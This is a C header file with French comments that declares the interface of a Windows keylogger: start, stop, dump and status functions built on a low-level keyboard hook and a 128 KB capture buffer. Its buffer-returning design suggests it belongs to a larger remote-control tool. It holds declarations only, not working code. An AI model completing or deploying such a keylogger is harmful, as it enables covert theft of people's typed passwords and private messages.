#ifndef KEYLOG_H
#define KEYLOG_H

#include <windows.h>

/* Codes de retour */
#define KEYLOG_SUCCESS               0
#define KEYLOG_ERROR_ALREADY_RUNNING 1
#define KEYLOG_ERROR_NOT_RUNNING     2
#define KEYLOG_ERROR_THREAD          3
#define KEYLOG_ERROR_BUFFER_FULL     4

/* Taille du buffer interne (128 Ko) */
#define KEYLOG_BUFFER_SIZE (128 * 1024)

/**
 * Démarre la capture des frappes clavier via WH_KEYBOARD_LL.
 * Lance un thread dédié avec une message loop Windows.
 *
 * @param output  Buffer de sortie
 * @param size    Taille du buffer
 * @return        KEYLOG_SUCCESS ou code d'erreur
 */
int keylog_start(char *output, size_t size);

/**
 * Arrête la capture des frappes clavier.
 * Le buffer interne est conservé jusqu'au prochain dump.
 *
 * @param output  Buffer de sortie
 * @param size    Taille du buffer
 * @return        KEYLOG_SUCCESS ou code d'erreur
 */
int keylog_stop(char *output, size_t size);

/**
 * Retourne le contenu du buffer de capture et le vide.
 *
 * @param output  Buffer de sortie
 * @param size    Taille du buffer
 * @return        KEYLOG_SUCCESS ou code d'erreur
 */
int keylog_dump(char *output, size_t size);

/**
 * Retourne le statut du keylogger et la taille du buffer courant.
 *
 * @param output  Buffer de sortie
 * @param size    Taille du buffer
 * @return        KEYLOG_SUCCESS
 */
int keylog_status(char *output, size_t size);

#endif /* KEYLOG_H */
